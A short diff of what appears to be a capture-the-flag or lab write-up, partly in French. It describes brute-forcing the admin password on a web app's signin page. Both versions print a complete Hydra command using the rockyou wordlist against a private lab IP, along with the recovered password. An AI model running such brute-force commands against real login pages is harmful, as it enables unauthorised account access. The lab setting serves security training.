@@ -1,4 +1,4 @@
-Using Hydra :
-hydra -l admin -P /usr/share/wordlists/rockyou.txt -u -f 172.20.10.10 http-get-form "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=WrongAnswer.gif"
-Login : admin
-Password : shadow
+Dans la page signin on peut faire un Brute Force sur le mot de passe avec le pseudo "admin"
+On brute force avec hydra:
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 192.168.1.16 http-get-form "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=WrongAnswer.gif"
+Le mot de passe correspondant trouvé : shadow
